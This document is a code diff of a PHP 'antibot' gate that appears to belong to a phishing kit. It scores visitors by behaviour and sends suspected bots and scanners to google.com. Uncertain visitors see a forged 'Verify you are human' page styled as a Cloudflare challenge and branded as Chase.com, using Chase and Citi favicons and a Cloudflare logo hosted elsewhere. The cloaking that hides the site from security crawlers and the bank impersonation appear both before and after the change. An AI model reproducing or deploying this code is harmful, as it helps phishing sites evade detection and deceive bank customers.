@@ -632,7 +632,7 @@ file_put_contents($LOG_FILE, $log_line, FILE_APPEND);
 // -------------------------------------------------
 
 // Check if this is first visit (no analysis done yet)
-$is_first_visit = !isset($_COOKIE['js_verified'], $_COOKIE['fp_hash'], $_COOKIE['analysis_done']);
+$is_first_visit = !isset($_COOKIE['js_verified']) && !isset($_COOKIE['fp_hash']) && !isset($_COOKIE['analysis_done']);
 
 if ($is_first_visit) {
     // First visit: Show analysis page for 5 seconds to collect behavioral data
@@ -728,352 +728,324 @@ if ($is_first_visit) {
     exit;
 }
 
-// Calculate bot confidence after initial analysis period
-$bot_analysis = calculate_bot_confidence($client_ip);
-$show_warning_ui = false;
-
-// Seamless access for confident humans
-if ($bot_analysis['is_confident_human']) {
-    // Set cookies to bypass CAPTCHA for confident humans
-    if (!isset($_COOKIE['js_verified'])) {
-        setcookie('js_verified', 'yes', time() + 86400, '/');
-        setcookie('fp_hash', 'human', time() + 86400, '/');
-    }
-}
-
-// Show warning UI only for uncertain cases
-if ($bot_analysis['is_uncertain']) {
-    $show_warning_ui = true;
-}
-
-// Block likely bots immediately
-if ($bot_analysis['is_likely_bot']) {
-    $reason = 'Behavioral Analysis: ' . implode(', ', $bot_analysis['reasons']);
-    block_and_exit($client_ip, $user_agent, $reason);
-}
-
-if (!isset($_COOKIE['js_verified'], $_COOKIE['fp_hash']) && $show_warning_ui) {
-    // احفظ الرابط الأصلي في localStorage من السيرفر للواجهة JS
-    echo '<script>try { localStorage.setItem("antibot_redirect", ' . json_encode($_SERVER['REQUEST_URI']) . '); }catch(e){}</script>';
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title id="dynamic-title">Verify you are human</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" href="https://www.citi.com/favicon.ico" sizes="any">
-  <link rel="icon" type="image/svg+xml" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
-  <style>
-    :root {
-      --box-border:#e5e7eb;
-      --box-bg:#fff;
-      --text:#222;
-      --muted:#8b8b8b;
-      --check:#198754;
-      --check-bg:#eaf7ed;
-      --shadow:0 1px 6px rgba(0,0,0,.06);
-    }
-
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background: #fff;
-      font-family: "Segoe UI","Tahoma","Arial",sans-serif;
-      color: var(--text);
-      display: flex;
-      justify-content: flex-start;
-      align-items: flex-start;
-    }
-
-    .wrap {
-      margin: 90px 0 0 48px; /* الكمبيوتر */
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      max-width: 640px;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    .head {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 6px;
-    }
-
-    .site-logo { height: 26px; width: auto; object-fit: contain; }
-    .site-title { font-size: 1.8rem; font-weight: 700; margin: 0; }
-    .desc { font-size: 1rem; margin: 0 0 16px 0; }
-
-    .cf-box {
-      position: relative;
-      background: var(--box-bg);
-      border: 1px solid var(--box-border);
-      border-radius: 6px;
-      box-shadow: var(--shadow);
-      width: 100%;
-      max-width: 560px;
-      padding: 10px 14px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 8px;
-      box-sizing: border-box;
-      overflow: hidden;
-    }
-
-    .cf-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
-    .cf-checkbox {
-      appearance: none;
-      width: 24px; height: 24px;
-      border: 2px solid #bfbfbf; border-radius: 6px;
-      background: #f9f9f9; cursor: pointer;
-      position: relative; outline: none;
-      transition: border-color .18s, background .18s;
-      flex: 0 0 24px;
-    }
-    .cf-checkbox:checked { border-color: var(--check); background: var(--check-bg); }
-    .cf-checkbox:checked::after {
-      content: "";
-      position: absolute;
-      left: 6px; top: 3px;
-      width: 8px; height: 14px;
-      border: solid var(--check);
-      border-width: 0 3px 3px 0;
-      transform: rotate(45deg);
-    }
-
-    .cf-text { font-size: .98rem; user-select: none; }
-    .cf-right { display: flex; flex-direction: column; align-items: flex-end; min-width: 70px; }
-    .cf-logo { height: 22px; object-fit: contain; margin-bottom: 4px; }
-    .cf-legal { font-size: .88rem; color: var(--muted); }
-
-    .state-overlay {
-      position: absolute;
-      inset: 0;
-      background: #fff;
-      display: none;
-      align-items: center;
-      gap: 10px;
-      padding: 0 14px;
-      font-size: .98rem;
-      font-weight: 600;
-    }
-
-    .state-overlay.active { display: flex; animation: fade .2s; }
-    .spinner {
-      width: 18px; height: 18px;
-      display: inline-block; position: relative;
-    }
-    .spinner::before {
-      content: "";
-      position: absolute; inset: 0;
-      border-radius: 50%;
-      border: 3px dotted #4a9cdb;
-      animation: spin 1s linear infinite;
-    }
-
-    .success-icon {
-      width: 22px; height: 22px;
-      border-radius: 50%;
-      background: #34c759; color: #fff;
-      display: inline-flex; align-items: center;
-      justify-content: center; font-size: 14px;
-    }
-
-    .foot { margin-top: 14px; font-size: .98rem; }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
-
-    /* 📱 نسخة الهاتف - نزلته تحت أكثر */
-    @media (max-width: 600px) {
-      .wrap {
-        margin: 110px 0 0 16px; /* ← زودت المسافة العلوية فقط للهاتف */
-        max-width: 100%;
-        width: calc(100vw - 32px);
-      }
-      .site-title { font-size: 1.25rem; }
-      .desc { font-size: .95rem; margin-bottom: 12px; }
-      .cf-box {
-        max-width: none;
-        width: 100%;
-        padding: 8px 12px;
-      }
-      .cf-text { font-size: .94rem; }
-      .cf-right { min-width: auto; }
-      .cf-logo { height: 20px; }
-      .foot { font-size: .9rem; }
-    }
-  </style>
-</head>
-<body>
-  <div class="wrap">
-    <div class="head">
-      <img id="site-logo" class="site-logo" src="https://www.chase.com/etc/designs/chase-ux/favicon.ico" alt="">
-      <h1 id="site-title" class="site-title">Chase.com</h1>
-    </div>
-    <p class="desc">Verify you are human by completing the action below.</p>
-
-    <form id="cfForm" class="cf-box" autocomplete="off" onsubmit="return false">
-      <label class="cf-left" for="cfCheck">
-        <input id="cfCheck" type="checkbox" class="cf-checkbox" aria-label="Verify you are human">
-        <span class="cf-text">Verify you are human</span>
-      </label>
-      <div class="cf-right" aria-hidden="true">
-        <img class="cf-logo" src="https://api.imghippo.com/files/oh3020lFQ.png" alt="CLOUDFLARE">
-        <div class="cf-legal">Privacy &nbsp;•&nbsp; Terms</div>
-      </div>
-
-      <div id="stateVerifying" class="state-overlay" aria-live="polite">
-        <span class="spinner" aria-hidden="true"></span>
-        <span>Verifying...</span>
-      </div>
-
-      <div id="stateSuccess" class="state-overlay" aria-live="polite">
-        <span class="success-icon">✔</span>
-        <span>Success!</span>
-      </div>
-    </form>
-
-    <p id="site-foot" class="foot">citi.com needs to review the security of your connection before proceeding.</p>
-  </div>
-
-  <script>
-    function setSite(name, logoUrl) {
-      document.getElementById('site-title').textContent = name;
-      document.getElementById('site-foot').textContent =
-        name + " needs to review the security of your connection before proceeding.";
-      document.getElementById('dynamic-title').textContent = name + " | Verify you are human";
-      if (logoUrl) document.getElementById('site-logo').src = logoUrl;
-    }
-
-    setSite("Chase.com", "https://www.chase.com/etc/designs/chase-ux/favicon.ico");
-
-    // Behavioral tracking for anti-bot detection
-    const behaviorData = {
-      clicks: [],
-      mouseMovements: [],
-      keyPresses: [],
-      startTime: Date.now(),
-      errors: 0,
-      hesitations: 0
-    };
-
-    // Track mouse movements for natural behavior
-    let lastMouseMove = Date.now();
-    document.addEventListener('mousemove', (e) => {
-      const now = Date.now();
-      const timeSinceLastMove = now - lastMouseMove;
-      behaviorData.mouseMovements.push({
-        x: e.clientX,
-        y: e.clientY,
-        time: now,
-        gap: timeSinceLastMove
-      });
-      lastMouseMove = now;
-      
-      // Keep only last 50 movements to avoid memory issues
-      if (behaviorData.mouseMovements.length > 50) {
-        behaviorData.mouseMovements.shift();
-      }
-    });
-
-    // Track clicks with timing
-    document.addEventListener('click', (e) => {
-      behaviorData.clicks.push({
-        x: e.clientX,
-        y: e.clientY,
-        time: Date.now(),
-        target: e.target.tagName
-      });
-    });
-
-    // Track keyboard interactions
-    document.addEventListener('keydown', (e) => {
-      behaviorData.keyPresses.push({
-        key: e.key,
-        time: Date.now()
-      });
-    });
-
-    const check = document.getElementById('cfCheck');
-    const vState = document.getElementById('stateVerifying');
-    const sState = document.getElementById('stateSuccess');
-    const originalUrl = localStorage.getItem('antibot_redirect') || '/';
-
-    check.addEventListener('change', () => {
-      if (!check.checked) {
-        vState.classList.remove('active');
-        sState.classList.remove('active');
-        return;
-      }
-      
-      // Calculate behavioral metrics
-      const totalTime = Date.now() - behaviorData.startTime;
-      const hasNaturalMovement = behaviorData.mouseMovements.length > 10;
-      const hasVariedTiming = behaviorData.mouseMovements.some(m => m.gap > 50);
-      const notTooFast = totalTime > 1000; // At least 1 second before clicking
-      
-      vState.classList.add('active');
-      
-      // Send behavioral data to server
-      const behaviorScore = {
-        totalTime,
-        mouseMovements: behaviorData.mouseMovements.length,
-        clicks: behaviorData.clicks.length,
-        naturalBehavior: hasNaturalMovement && hasVariedTiming && notTooFast
-      };
-      
-      // Store in localStorage for potential server-side verification
-      try {
-        localStorage.setItem('behavior_check', JSON.stringify(behaviorScore));
-      } catch(e) {}
-      
-      document.cookie = "js_verified=yes; path=/";
-      document.cookie = "fp_hash=human; path=/";
-      document.cookie = "behavior_verified=" + (behaviorScore.naturalBehavior ? "yes" : "uncertain") + "; path=/";
-      
-      setTimeout(() => {
-        vState.classList.remove('active');
-        sState.classList.add('active');
-        setTimeout(() => { location.href = originalUrl; }, 900);
-      }, 800);
-    });
-  </script>
-</body>
-</html>
-
-<?php exit; } ?>
-
-<?php
-// API endpoint for tracking behavioral data during normal browsing
-if (isset($_POST['track_behavior']) && isset($_POST['behavior_data'])) {
-    header('Content-Type: application/json');
+// Calculate bot confidence after initial analysis period (only if analysis_done cookie exists)
+if (isset($_COOKIE['analysis_done']) && !isset($_COOKIE['js_verified'], $_COOKIE['fp_hash'])) {
+    $bot_analysis = calculate_bot_confidence($client_ip);
     
-    $raw_data = $_POST['behavior_data'];
-    
-    // Validate size to prevent memory exhaustion
-    if (strlen($raw_data) > MAX_BEHAVIOR_DATA_SIZE) {
-        echo json_encode(['status' => 'error', 'message' => 'Data too large']);
+    // Block likely bots immediately - redirect to a famous website
+    if ($bot_analysis['is_likely_bot']) {
+        $reason = 'Behavioral Analysis: ' . implode(', ', $bot_analysis['reasons']);
+        // Log the block
+        file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | BLOCKED | IP: {$client_ip} | UA: {$user_agent} | Reason: {$reason}\n", FILE_APPEND);
+        // Redirect bots to a well-known site instead of showing block page
+        header("Location: https://www.google.com");
         exit;
     }
     
-    $behavior_data = json_decode($raw_data, true);
-    if ($behavior_data && is_array($behavior_data)) {
-        $client_ip = get_client_ip();
-        $action = $behavior_data['action'] ?? 'unknown';
-        $timestamp = $behavior_data['timestamp'] ?? time();
-        
-        track_temporal_behavior($client_ip, $action, $timestamp, $behavior_data);
-        
-        echo json_encode(['status' => 'success', 'tracked' => true]);
-    } else {
-        echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
+    // Seamless access for confident humans - set cookies and allow entry
+    if ($bot_analysis['is_confident_human']) {
+        setcookie('js_verified', 'yes', time() + 86400, '/');
+        setcookie('fp_hash', 'human', time() + 86400, '/');
+        // Allow the page to continue loading - no exit, no redirect
     }
-    exit;
+    
+    // Show warning UI only for uncertain cases
+    if ($bot_analysis['is_uncertain']) {
+        // Show CAPTCHA page
+        ?>
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8" />
+          <title id="dynamic-title">Verify you are human</title>
+          <meta name="viewport" content="width=device-width, initial-scale=1" />
+          <link rel="icon" href="https://www.citi.com/favicon.ico" sizes="any">
+          <link rel="icon" type="image/svg+xml" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+          <style>
+            :root {
+              --box-border:#e5e7eb;
+              --box-bg:#fff;
+              --text:#222;
+              --muted:#8b8b8b;
+              --check:#198754;
+              --check-bg:#eaf7ed;
+              --shadow:0 1px 6px rgba(0,0,0,.06);
+            }
+
+            html, body {
+              margin: 0;
+              padding: 0;
+              height: 100%;
+              background: #fff;
+              font-family: "Segoe UI","Tahoma","Arial",sans-serif;
+              color: var(--text);
+              display: flex;
+              justify-content: flex-start;
+              align-items: flex-start;
+            }
+
+            .wrap {
+              margin: 90px 0 0 48px;
+              display: flex;
+              flex-direction: column;
+              align-items: flex-start;
+              max-width: 640px;
+              width: 100%;
+              box-sizing: border-box;
+            }
+
+            .head {
+              display: flex;
+              align-items: center;
+              gap: 8px;
+              margin-bottom: 6px;
+            }
+
+            .site-logo { height: 26px; width: auto; object-fit: contain; }
+            .site-title { font-size: 1.8rem; font-weight: 700; margin: 0; }
+            .desc { font-size: 1rem; margin: 0 0 16px 0; }
+
+            .cf-box {
+              position: relative;
+              background: var(--box-bg);
+              border: 1px solid var(--box-border);
+              border-radius: 6px;
+              box-shadow: var(--shadow);
+              width: 100%;
+              max-width: 560px;
+              padding: 10px 14px;
+              display: flex;
+              align-items: center;
+              justify-content: space-between;
+              gap: 8px;
+              box-sizing: border-box;
+              overflow: hidden;
+            }
+
+            .cf-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
+            .cf-checkbox {
+              appearance: none;
+              width: 24px; height: 24px;
+              border: 2px solid #bfbfbf; border-radius: 6px;
+              background: #f9f9f9; cursor: pointer;
+              position: relative; outline: none;
+              transition: border-color .18s, background .18s;
+              flex: 0 0 24px;
+            }
+            .cf-checkbox:checked { border-color: var(--check); background: var(--check-bg); }
+            .cf-checkbox:checked::after {
+              content: "";
+              position: absolute;
+              left: 6px; top: 3px;
+              width: 8px; height: 14px;
+              border: solid var(--check);
+              border-width: 0 3px 3px 0;
+              transform: rotate(45deg);
+            }
+
+            .cf-text { font-size: .98rem; user-select: none; }
+            .cf-right { display: flex; flex-direction: column; align-items: flex-end; min-width: 70px; }
+            .cf-logo { height: 22px; object-fit: contain; margin-bottom: 4px; }
+            .cf-legal { font-size: .88rem; color: var(--muted); }
+
+            .state-overlay {
+              position: absolute;
+              inset: 0;
+              background: #fff;
+              display: none;
+              align-items: center;
+              gap: 10px;
+              padding: 0 14px;
+              font-size: .98rem;
+              font-weight: 600;
+            }
+
+            .state-overlay.active { display: flex; animation: fade .2s; }
+            .spinner {
+              width: 18px; height: 18px;
+              display: inline-block; position: relative;
+            }
+            .spinner::before {
+              content: "";
+              position: absolute; inset: 0;
+              border-radius: 50%;
+              border: 3px dotted #4a9cdb;
+              animation: spin 1s linear infinite;
+            }
+
+            .success-icon {
+              width: 22px; height: 22px;
+              border-radius: 50%;
+              background: #34c759; color: #fff;
+              display: inline-flex; align-items: center;
+              justify-content: center; font-size: 14px;
+            }
+
+            .foot { margin-top: 14px; font-size: .98rem; }
+
+            @keyframes spin { to { transform: rotate(360deg); } }
+            @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
+
+            @media (max-width: 600px) {
+              .wrap {
+                margin: 110px 0 0 16px;
+                max-width: 100%;
+                width: calc(100vw - 32px);
+              }
+              .site-title { font-size: 1.25rem; }
+              .desc { font-size: .95rem; margin-bottom: 12px; }
+              .cf-box {
+                max-width: none;
+                width: 100%;
+                padding: 8px 12px;
+              }
+              .cf-text { font-size: .94rem; }
+              .cf-right { min-width: auto; }
+              .cf-logo { height: 20px; }
+              .foot { font-size: .9rem; }
+            }
+          </style>
+        </head>
+        <body>
+          <div class="wrap">
+            <div class="head">
+              <img id="site-logo" class="site-logo" src="https://www.chase.com/etc/designs/chase-ux/favicon.ico" alt="">
+              <h1 id="site-title" class="site-title">Chase.com</h1>
+            </div>
+            <p class="desc">Verify you are human by completing the action below.</p>
+
+            <form id="cfForm" class="cf-box" autocomplete="off" onsubmit="return false">
+              <label class="cf-left" for="cfCheck">
+                <input id="cfCheck" type="checkbox" class="cf-checkbox" aria-label="Verify you are human">
+                <span class="cf-text">Verify you are human</span>
+              </label>
+              <div class="cf-right" aria-hidden="true">
+                <img class="cf-logo" src="https://api.imghippo.com/files/oh3020lFQ.png" alt="CLOUDFLARE">
+                <div class="cf-legal">Privacy &nbsp;•&nbsp; Terms</div>
+              </div>
+
+              <div id="stateVerifying" class="state-overlay" aria-live="polite">
+                <span class="spinner" aria-hidden="true"></span>
+                <span>Verifying...</span>
+              </div>
+
+              <div id="stateSuccess" class="state-overlay" aria-live="polite">
+                <span class="success-icon">✔</span>
+                <span>Success!</span>
+              </div>
+            </form>
+
+            <p id="site-foot" class="foot">citi.com needs to review the security of your connection before proceeding.</p>
+          </div>
+
+          <script>
+            function setSite(name, logoUrl) {
+              document.getElementById('site-title').textContent = name;
+              document.getElementById('site-foot').textContent =
+                name + " needs to review the security of your connection before proceeding.";
+              document.getElementById('dynamic-title').textContent = name + " | Verify you are human";
+              if (logoUrl) document.getElementById('site-logo').src = logoUrl;
+            }
+
+            setSite("Chase.com", "https://www.chase.com/etc/designs/chase-ux/favicon.ico");
+
+            // Behavioral tracking for anti-bot detection
+            const behaviorData = {
+              clicks: [],
+              mouseMovements: [],
+              keyPresses: [],
+              startTime: Date.now(),
+              errors: 0,
+              hesitations: 0
+            };
+
+            // Track mouse movements for natural behavior
+            let lastMouseMove = Date.now();
+            document.addEventListener('mousemove', (e) => {
+              const now = Date.now();
+              const timeSinceLastMove = now - lastMouseMove;
+              behaviorData.mouseMovements.push({
+                x: e.clientX,
+                y: e.clientY,
+                time: now,
+                gap: timeSinceLastMove
+              });
+              lastMouseMove = now;
+              
+              if (behaviorData.mouseMovements.length > 50) {
+                behaviorData.mouseMovements.shift();
+              }
+            });
+
+            // Track clicks with timing
+            document.addEventListener('click', (e) => {
+              behaviorData.clicks.push({
+                x: e.clientX,
+                y: e.clientY,
+                time: Date.now(),
+                target: e.target.tagName
+              });
+            });
+
+            // Track keyboard interactions
+            document.addEventListener('keydown', (e) => {
+              behaviorData.keyPresses.push({
+                key: e.key,
+                time: Date.now()
+              });
+            });
+
+            const check = document.getElementById('cfCheck');
+            const vState = document.getElementById('stateVerifying');
+            const sState = document.getElementById('stateSuccess');
+            const originalUrl = localStorage.getItem('antibot_redirect') || '/';
+
+            check.addEventListener('change', () => {
+              if (!check.checked) {
+                vState.classList.remove('active');
+                sState.classList.remove('active');
+                return;
+              }
+              
+              const totalTime = Date.now() - behaviorData.startTime;
+              const hasNaturalMovement = behaviorData.mouseMovements.length > 10;
+              const hasVariedTiming = behaviorData.mouseMovements.some(m => m.gap > 50);
+              const notTooFast = totalTime > 1000;
+              
+              vState.classList.add('active');
+              
+              const behaviorScore = {
+                totalTime,
+                mouseMovements: behaviorData.mouseMovements.length,
+                clicks: behaviorData.clicks.length,
+                naturalBehavior: hasNaturalMovement && hasVariedTiming && notTooFast
+              };
+              
+              try {
+                localStorage.setItem('behavior_check', JSON.stringify(behaviorScore));
+              } catch(e) {}
+              
+              document.cookie = "js_verified=yes; path=/";
+              document.cookie = "fp_hash=human; path=/";
+              document.cookie = "behavior_verified=" + (behaviorScore.naturalBehavior ? "yes" : "uncertain") + "; path=/";
+              
+              setTimeout(() => {
+                vState.classList.remove('active');
+                sState.classList.add('active');
+                setTimeout(() => { location.href = originalUrl; }, 900);
+              }, 800);
+            });
+          </script>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
 }
+
+// If we reach here, allow the page to continue loading
+// This happens when:
+// 1. User already has js_verified and fp_hash cookies (returning visitor)
+// 2. User was identified as confident human and cookies were set
+// The rest of the protected page will load normally
 ?>
